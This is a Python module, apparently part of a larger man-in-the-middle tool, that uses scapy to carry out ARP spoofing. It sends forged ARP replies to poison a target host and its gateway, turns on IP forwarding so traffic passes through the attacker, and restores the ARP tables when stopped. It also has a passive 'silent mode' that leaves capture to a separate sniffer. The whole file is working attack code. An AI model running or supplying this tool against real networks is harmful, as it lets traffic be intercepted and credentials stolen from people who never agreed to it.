import time
import scapy.all as scapy
from . import STATUS, STOP_EVENT
from .utils import log_msg, set_ip_forwarding, set_port_forwarding, get_mac


# Helper Functions
def get_own_mac(interface):
    try: 
        return scapy.get_if_hwaddr(interface)
    except: 
        return None


# ARP Spoofing Core Functions
def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
    packet = scapy.Ether(dst=target_mac, src=attacker_mac) / \
             scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    scapy.sendp(packet, verbose=False, iface=STATUS["interface"])

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])

# --- UPDATED TO SUPPORT SILENT MODE ---
def run_attack_loop(target_ip, gateway_ip, passive=False):
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    set_ip_forwarding(1)
    
    try:
        attacker_mac = get_own_mac(STATUS["interface"])
        target_mac = get_mac(target_ip)
        if not target_mac: target_mac = "ff:ff:ff:ff:ff:ff"
        STATUS["target_mac"] = target_mac
        mitm_mac = get_mac(gateway_ip)
        
        if passive:
            log_msg("[*] SILENT MODE STARTED: Passive Monitoring Only.")
        else:
            log_msg("[*] ACTIVE ATTACK STARTED: ARP Poisoning Enabled.")

        while not STOP_EVENT.is_set():
            # CRITICAL: Only send packets if NOT passive
            if not passive:
                spoof(target_ip, gateway_ip, target_mac, attacker_mac)
                if mitm_mac:
                    spoof(gateway_ip, target_ip, mitm_mac, attacker_mac)
                STATUS["packets"] += 1
            
            # In silent mode, we just wait. The sniffer does the work.
            time.sleep(2)
            
    except Exception as e: log_msg(f"ARP ERROR: {e}")
    finally:
        if not passive:
            log_msg("[-] Stopping ARP... Restoring network.")
            restore(target_ip, gateway_ip)
        else:
            log_msg("[-] Stopping Silent Monitor.")
            
        set_ip_forwarding(0)
        set_port_forwarding(False)
        STATUS["state"] = "IDLE"
        STATUS["mode"] = "NONE"
        STOP_EVENT.clear()